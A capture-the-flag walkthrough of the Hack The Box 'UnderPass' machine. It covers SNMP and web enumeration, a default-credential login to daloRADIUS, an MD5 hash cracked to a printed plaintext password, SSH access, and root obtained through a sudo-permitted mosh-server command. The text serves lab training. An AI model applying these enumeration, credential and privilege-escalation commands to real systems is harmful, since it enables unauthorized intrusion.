![](images/image0.png)

# UnderPass HTB Walkthrough

---

## Enumeration

```bash
nmap -p- -Pn 10.129.231.213 -v -T5 --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn 10.129.231.213 -sC -sV -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn 10.129.231.213 -v --script vuln -oN nmap_vuln.txt
```

![](images/image2.png)

---

## Web Enumeration

On **port 80**, we found a web server running.

![](images/image17.png)

Directory fuzzing and subdomain enumeration didn’t reveal much, so I decided to check for **UDP ports**.

```bash
nmap -sU -T5 10.129.231.213
```

![](images/image5.png)

We see that **SNMP (port 161)** is open.

---

## SNMP Enumeration

```bash
nmap -sU -T5 -sC -sV -p161 10.129.231.213
```

![](images/image10.png)

Then ran:

```bash
snmpbulkwalk -c public -v2c 10.129.231.213
```

We got an email of a user and discovered that this is a **Daloradius** server.

![](images/image11.png)

---

## Web Exploitation

Visited the `/daloradius` endpoint — got **403 Forbidden**, so fuzzed it further.

```bash
ffuf -u http://10.129.231.213/daloradius/FUZZ -w /usr/share/wordlists/dirb/big.txt -s -recursion
```

![](images/image16.png)
![](images/image6.png)
![](images/image4.png)

Found `/app/users` endpoint showing a **login form**.

![](images/image9.png)

Also discovered `/app/operators`, so we tried default credentials.

![](images/image12.png)
![](images/image15.png)

Login was successful.

![](images/image13.png)

Found user **svcMosh** listed with an MD5 password hash.

![](images/image14.png)

---

## Cracking Credentials

Used **John the Ripper** to crack the hash and got:

```
svcMosh : underwaterfriends
```

![](images/image8.png)

---

## SSH Access

Logged in as **svcMosh**:

```bash
ssh svcMosh@10.129.231.213
```

![](images/image7.png)

User flag located in the initial directory.

---

## Privilege Escalation

Running `sudo -l` revealed we can execute `mosh-server` as sudo.

![](images/image1.png)

After some research, found this payload:

```bash
mosh --server="sudo /usr/bin/mosh-server" localhost
```

![](images/image3.png)

Successfully gained root access.

Root flag located at `/root/root.txt`.

---
